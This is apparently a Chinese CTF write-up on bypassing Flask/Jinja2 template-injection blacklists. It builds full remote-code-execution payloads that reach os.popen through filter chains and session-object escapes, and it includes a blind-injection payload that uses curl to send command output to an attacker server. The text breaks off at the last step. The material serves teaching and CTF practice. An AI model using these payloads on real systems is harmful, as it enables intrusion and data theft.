在 Flask JinJa 中，内只有很多过滤器可以使用，前文的 attr() 就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。

详情请看官方文档：[https://jinja.palletsprojects.com/en/master/templates/#builtin-filters](https://jinja.palletsprojects.com/en/master/templates/#builtin-filters)

以下是内置的所有的过滤器列表：

<table><thead><tr><th><a href="https://jinja.palletsprojects.com/en/master/templates/#abs" target="_blank"><code>abs()</code></a></th><th><a href="https://jinja.palletsprojects.com/en/master/templates/#float" target="_blank"><code>float()</code></a></th><th><a href="https://jinja.palletsprojects.com/en/master/templates/#lower" target="_blank"><code>lower()</code></a></th><th><a href="https://jinja.palletsprojects.com/en/master/templates/#round" target="_blank"><code>round()</code></a></th><th><a href="https://jinja.palletsprojects.com/en/master/templates/#tojson" target="_blank"><code>tojson()</code></a></th></tr></thead><tbody><tr><td><a href="https://jinja.palletsprojects.com/en/master/templates/#attr" target="_blank"><code>attr()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#forceescape" target="_blank"><code>forceescape()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#map" target="_blank"><code>map()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#safe" target="_blank"><code>safe()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#trim" target="_blank"><code>trim()</code></a></td></tr><tr><td><a href="https://jinja.palletsprojects.com/en/master/templates/#batch" target="_blank"><code>batch()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#format" target="_blank"><code>format()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#max" target="_blank"><code>max()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#select" target="_blank"><code>select()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#truncate" target="_blank"><code>truncate()</code></a></td></tr><tr><td><a href="https://jinja.palletsprojects.com/en/master/templates/#capitalize" target="_blank"><code>capitalize()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#groupby" target="_blank"><code>groupby()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#min" target="_blank"><code>min()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#selectattr" target="_blank"><code>selectattr()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#unique" target="_blank"><code>unique()</code></a></td></tr><tr><td><a href="https://jinja.palletsprojects.com/en/master/templates/#center" target="_blank"><code>center()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#indent" target="_blank"><code>indent()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#pprint" target="_blank"><code>pprint()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#slice" target="_blank"><code>slice()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#upper" target="_blank"><code>upper()</code></a></td></tr><tr><td><a href="https://jinja.palletsprojects.com/en/master/templates/#default" target="_blank"><code>default()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#int" target="_blank"><code>int()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#random" target="_blank"><code>random()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#sort" target="_blank"><code>sort()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#urlencode" target="_blank"><code>urlencode()</code></a></td></tr><tr><td><a href="https://jinja.palletsprojects.com/en/master/templates/#dictsort" target="_blank"><code>dictsort()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#join" target="_blank"><code>join()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#reject" target="_blank"><code>reject()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#string" target="_blank"><code>string()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#urlize" target="_blank"><code>urlize()</code></a></td></tr><tr><td><a href="https://jinja.palletsprojects.com/en/master/templates/#escape" target="_blank"><code>escape()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#last" target="_blank"><code>last()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#rejectattr" target="_blank"><code>rejectattr()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#striptags" target="_blank"><code>striptags()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#wordcount" target="_blank"><code>wordcount()</code></a></td></tr><tr><td><a href="https://jinja.palletsprojects.com/en/master/templates/#filesizeformat" target="_blank"><code>filesizeformat()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#length" target="_blank"><code>length()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#replace" target="_blank"><code>replace()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#sum" target="_blank"><code>sum()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#wordwrap" target="_blank"><code>wordwrap()</code></a></td></tr><tr><td><a href="https://jinja.palletsprojects.com/en/master/templates/#first" target="_blank"><code>first()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#list" target="_blank"><code>list()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#reverse" target="_blank"><code>reverse()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#title" target="_blank"><code>title()</code></a></td><td><a href="https://jinja.palletsprojects.com/en/master/templates/#xmlattr" target="_blank"><code>xmlattr()</code></a></td></tr></tbody></table>

可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。

### 常用字符获取入口点

*   对于获取一般字符的方法有以下几种：

```
{% set org = ({ }|select()|string()) %}{{org}}
{% set org = (self|string()) %}{{org}}
{% set org = self|string|urlencode %}{{org}}
{% set org = (app.__doc__|string) %}{{org}}


```

如下演示：

```
{% set org = ({ }|select()|string()) %}{{org}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174659-26b17380-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174659-26b17380-bd3e-1.png)

上上图所示，我们可以通过 `<generator object select_or_reject at 0x7fe339298fc0>` 字符串获取的字符有：尖号、字母、空格、下划线和数字。

```
{% set org = (self|string()) %}{{org}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174700-26d65cf4-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174700-26d65cf4-bd3e-1.png)

如上图所示，可以通过 `<TemplateReference None>` 字符串获取的字符有：尖号、字母和空格。

```
{% set org = self|string|urlencode %}{{org}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174700-2704f384-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174700-2704f384-bd3e-1.png)

如上图所示，可以获得的字符除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符，这个在下面第二道题中会讲到。

```
{% set org = (app.__doc__|string) %}{{org}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174700-2731127a-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174700-2731127a-bd3e-1.png)

如上图所示，可获得到的字符更多了。

*   对于获取数字，除了当菜出现的那几种外我们还可以有以下几种方法：

```
{% set num = (self|int) %}{{num}}    # 0, 通过int过滤器获取数字
{% set num = (self|string|length) %}{{num}}    # 24, 通过length过滤器获取数字
{% set point = self|float|string|min %}    # 通过float过滤器获取点 .


```

有了数字 0 之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。

下面我们通过两道题目 payload 的构造过程来演示一下如何使用过滤器来 Bypass。

### [2020 DASCTF 八月安恒月赛]ezflask

题目源码：

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory
app = Flask(__name__)


@app.route("/")
def index():
    def safe_jinja(s):
        blacklist = ['class', 'attr', 'mro', 'base',
                     'request', 'session', '+', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', '[', ']', '\'', '"', '{}']
        flag = True
        for no in blacklist:
            if no.lower() in s.lower():
                flag = False
                break
        return flag
    if not request.args.get('name'):
        return open(__file__).read()
    elif safe_jinja(request.args.get('name')):
        name = request.args.get('name')
    else:
        name = 'wendell'
    template = '''

    <div>
        <p>Hello, %s</p>
    </div>
    <!--flag in /flag-->
    <!--python3.8-->
''' % (name)
    return render_template_string(template)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)


```

可以看到题目过滤的死死地，最关键是把 attr 也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。

在存在 ssti 的地方执行如下 payload：

```
{% set org = ({ }|select()|string()) %}{{org}}
# 或 {% set org = ({ }|select|string) %}{{org}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174701-275b3a1e-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174701-275b3a1e-bd3e-1.png)

可以看到，我们得到了一段字符串：`<generator object select_or_reject at 0x7f06771f4150>`，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 `<generator object select_or_reject at 0x7f06771f4150>` 这个字符串中取到我们想要的字符，从而绕过过滤。

然后我们在使用 list() 过滤器将字符串转化为列表：

```
{% set orglst = ({ }|select|string|list) %}{{orglst}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174701-2780bf78-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174701-2780bf78-bd3e-1.png)

如上图所示，反回了一个列表，列表中是 `<generator object select_or_reject at 0x7f06771f4150>` 这个字符串的每一个字符。接下来我们便可以使用使用 pop() 等方法将列表里的字符取出来了。如下所示，我们取一个下划线 `_`：

```
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174701-27a4f47e-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174701-27a4f47e-bd3e-1.png)

同理还能取到更多的字符：

```
{% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}}    # 空格
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
{% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}}    # 0
{% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}}    # 7
......


```

这里，其实有了数字 0 之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：

```
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}{{one}}    # 1
{%set two = (zero-one-one)|abs %}    # 2
{%set three = (zero-one-one-one)|abs %}    # 3
{% set five = (two*two*two)-one-one-one %}    # 5
#  {%set four = (one+three) %}    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了
......


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174701-27cdd556-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174701-27cdd556-bd3e-1.png)

通过上述原理，我们可以依次获得构造 payload 所需的特殊字符与字符串：

```
# 首先构造出所需的数字:
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串:
{% set xhx = (({ }|select|string|list).pop(24)|string) %}    # _
{% set space = (({ }|select|string|list).pop(10)|string) %}    # 空格
{% set point = ((app.__doc__|string|list).pop(26)|string) %}    # .
{% set yin = ((app.__doc__|string|list).pop(195)|string) %}    # 单引号 '
{% set left = ((app.__doc__|string|list).pop(189)|string) %}    # 左括号 (
{% set right = ((app.__doc__|string|list).pop(200)|string) %}    # 右括号 )

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc=bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set os = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx*2~but~xhx*2 %}    # __builtins__


```

将上面构造的字符或字符串拼接起来构造出 `__import__('os').popen('cat /flag').read()`：

```
{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174702-282904b2-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174702-282904b2-bd3e-1.png)

如上图所示，成功构造出了 `__import__('os').popen('cat /flag').read()` 。

然后将上面构造的各种变量添加到 SSTI 万能 payload 里面就行了：

```
{% for f,v in whoami.__init__.__globals__.items() %}    # globals
    {% if f == bul %} 
        {% for a,b in v.items() %}    # builtins
            {% if a == ev %}    # eval
                {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}


```

所以最终的 payload 为：

```
{% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174702-287d6fde-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174702-287d6fde-bd3e-1.png)

如上图所示，成功执行命令并得到了 flag。

### [2021 MAR & DASCTF]baby_flask

当时这道题没做出来，这里我们在本地使用 vulnhub 中的 flask 搭建环境进行复现：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174703-28a5378a-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174703-28a5378a-bd3e-1.png)

在 `/getname?name=` 处存在 SSTI。

F12 查看源代码发现提示过滤了一下字符：

```
blacklist</br>   
'.','[','\'','"','\\','+',':','_',</br>   
'chr','pop','class','base','mro','init','globals','get',</br>   
'eval','exec','os','popen','open','read',</br>   
'select','url_for','get_flashed_messages','config','request',</br>   
'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9'</br>


```

过滤的死死地，甚至将所有的数字都过滤了。我们仍然可以使用通过滤器进行绕过，经过之前那道题的演示，我们可以很容易的构造出被过滤了的字符或字符串。

Payload 构造过程如下：

```
# 首先构造出所需的数字: 
{% set zero = (self|int) %}    # 0, 也可以使用lenght过滤器获取数字
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set three = five-one-one %}    # 3
{% set nine = (two*two*two*two-five-one-one) %}    # 9
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串: 
{% set space = self|string|min %}    # 空格
{% set point = self|float|string|min %}    # .

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc = bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set yin = bfhc%((three~nine)|int) %}    # 使用%c构造引号 '
{% set xhx = bfhc%((nine~five)|int) %}    # 使用%c构造下划线 _
{% set right = bfhc%((four~one)|int) %}    # 使用%c构造右括号 )
{% set left = bfhc%((four~zero)|int) %}    # 使用%c构造左括号 (

{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set so = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx~xhx~but~xhx~xhx %}    # __builtins__

{% set ini = dict(ini=aa,t=bb)|join %}    # init
{% set glo = dict(glo=aa,bals=bb)|join %}    # globals
{% set itm = dict(ite=aa,ms=bb)|join %}    # items

# 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): 
{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}

# 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: 
{% for f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}    # globals
    {% if f == bul %} 
        {% for a,b in (v|attr(itm))() %}    # builtins
            {% if a == ev %}    # eval
                {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}

# 最后的payload如下:
{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174703-28f00652-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174703-28f00652-bd3e-1.png)

过滤了 request 和 class
-------------------

这里除了用上面中括号或 `|attr()` 那几种方法外，我们还可以利用 flask 里面的 session 对象和 config 对象来逃逸这一姿势。

下面通过 NCTF2018 的两道 flask 题目来仔细讲解。

### [NCTF2018]flask 真香

打开题目一看，是一个炫酷的 demo 演示，这种 demo 一般是没有啥东西好挖的。首先 F12 信息收集，发现 Python 版本是 3.5.2，没有 Web 静态服务器。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174704-299b32fc-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174704-299b32fc-bd3e-1.png)

随便点开第二个 demo 发现 404 了，这里注意到 404 界面是 Flask 提供的 404 界面，按照以往的经验，猜测这里存在 SSTI 注入。

先尝试简单的 payload：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174705-2a23c158-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174705-2a23c158-bd3e-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174706-2aa5caa4-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174706-2aa5caa4-bd3e-1.png)

从这里可见，毫无疑问的存在 SSTI 漏洞了。

那么就来康康到底有没有 WAF，有的话被过滤了哪些。经过一番测试，确实很多东西都被过滤了，而且是正则表达式直接匹配删去，无法嵌套绕过。不完整测试有以下：

```
config
class
mro
args
request
open
eval
builtins
import


```

从这里来看，似乎已经完全无法下手了。因为 request 和 class 都被过滤掉了。

卡在这里以后，最好的办法就是去查 Flask 官方文档了。从 Flask 官方文档里，找到了 session 对象，经过测试没有被过滤。更巧的是，session 一定是一个 dict 对象，因此我们可以通过键的方法访问相应的类。**由于键是一个字符串，因此可以通过字符串拼接绕过。**

python：

```
{{session['__cla'+'ss__']}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174708-2b8b56e6-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174708-2b8b56e6-bd3e-1.png)

访问到了类，我们就可以通过 `__bases__` 来获取基类的元组，带上索引 0 就可以访问到相应的基类。由此一直向上我们就可以访问到最顶层的`object`基类了。**（同样的，如果没有过滤 config 的话，我们还可以利用 config 来逃逸，方法与 session 的相同）**

payload：

```
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174709-2c443062-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174709-2c443062-bd3e-1.png)

有了对象基类，我们就可以通过访问 `__subclasses__` 方法再实例化去访问所有的子类。同样使用字符串拼接绕过 WAF，这样就实现沙箱逃逸了。

payload：

```
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'ss__']()}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174712-2e0adcc0-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174712-2e0adcc0-bd3e-1.png)

SSTI 目的无非就是两个：文件读写、执行命令。因此我们核心应该放在 file 类和 os 类。而坑爹的是，Python3 几乎换了个遍。因此这里得去看官方文档去找相应的基类的用处。

我还是从 os 库入手，直接搜索 “os”，找到了 `os._wrap_close` 类，同样使用 dict 键访问的方法。猜大致范围得到了索引序号，我这里序号是 312，

payload：

```
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[312]}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174713-2ea589fa-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174713-2ea589fa-bd3e-1.png)

我们调用它的 `__init__` 函数将其实例化，然后用 `__globals__` 查看其全局变量。

payload：

```
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[312].__init__.__globals__}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174716-305bbc9c-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174716-305bbc9c-bd3e-1.png)

眼又花了，但我们的目的很明显，就是要执行命令，于是直接搜索 “popen” 就可以了：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174717-30f4321a-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174717-30f4321a-bd3e-1.png)

由于又是一个 dict 类型，我们调用的时候又可以使用字符串拼接，绕过 open 过滤。

后面顺理成章的，我们将命令字符串传入，实例化这个函数，然后直接调用 read 方法就可以了。

payload：

```
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[312].__init__.__globals__['po'+'pen']('ls /').read()}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174718-318fa952-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174718-318fa952-bd3e-1.png)

```
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[312].__init__.__globals__['po'+'pen']('cat /Th1s__is_S3cret').read()}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174719-3222536a-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174719-3222536a-bd3e-1.png)

### [NCTF2018]Flask PLUS

看到又是 Flask，后面又加了 PLUS，想必内容肯定没变，应该是过滤内容增加了。

打开题目康康，果然还是 demo，随便造一个 404，还是那个界面。

直接拿上一道题的 payload 去找所有的类，果然还是那么多。找到 `os._wrap_close` 类，打一发上次的 payload，结果炸了：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174719-329c288e-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174719-329c288e-bd3e-1.png)

也就是说，这里更新了过滤的内容，需要 bypass。

我们来探测了一下，发现这次又加了一些过滤：

```
__init__
file
__dict__
__builtins__
__import__
getattr
os


```

完蛋了了，很多方法被过滤了之后，几乎无法访问到我们所需要的方法。

到这里，我们本地机测试一下，看看有哪些方法我们可以用的：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174721-3387fce6-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174721-3387fce6-bd3e-1.png)

这里我们注意到了`__enter__`方法，查看其内容，发现其竟然有 `__globals__` 方法可用，也就是说这个`__enter__`方法与 `__init__` 方法一模一样。

这里摘抄下一段 stack overflow 的一段话

这里摘抄下一段 stack overflow 的一段话

> *   `__init__` (allocation of the class)
> *   `__enter__` (enter context)
> *   `__exit__` (leaving context)

因此 `__enter__` 仅仅访问类的内容，但这已经可以达到我们所需要的目的了。

构造 payload：

```
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[256].__enter__.__globals__['po'+'pen']('ls /').read()}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174722-3467f47c-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174722-3467f47c-bd3e-1.png)

```
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[256].__enter__.__globals__['po'+'pen']('cat /Th1s_is__F1114g').read()}}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174723-34f973de-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174723-34f973de-bd3e-1.png)

没有回显的 SSTI
----------

当目标存在 SSTI 漏洞但是没有 payload 执行的回显时，我们可以使用 `os.popen` 和 `curl` 将执行结果外带出来。

例如下面这道题。进入题目后，会让你输入一个姓名然后将其输出：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174724-35381530-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174724-35381530-bd3e-1.png)

经测试目标存在 SSTI 漏洞，但是过滤了 `{{` 和 `}}`，我们可以使用 `{%print(......)%}` 的形式来绕过。

但是执行后却没有任何回显了，所以我们还得换一条路子。这里我们使用 `{% if ... %}1{% endif %}` 配合 `os.popen` 和 `curl` 外带数据的方法。

首先在自己 vps 上面开启监听：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174724-3575b44e-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174724-3575b44e-bd3e-1.png)

然后执行如下 payload 在根目录里面寻找 flag：

```
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://47.xxx.xxx.72:2333 -d `ls /|grep flag`') %}1{% endif %}


```

如下图所示，发现 flag 文件：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210525174725-35ba9c3a-bd3e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210525174725-35ba9c3a-bd3e-1.png)

执行如下 payload 读取 flag：

```
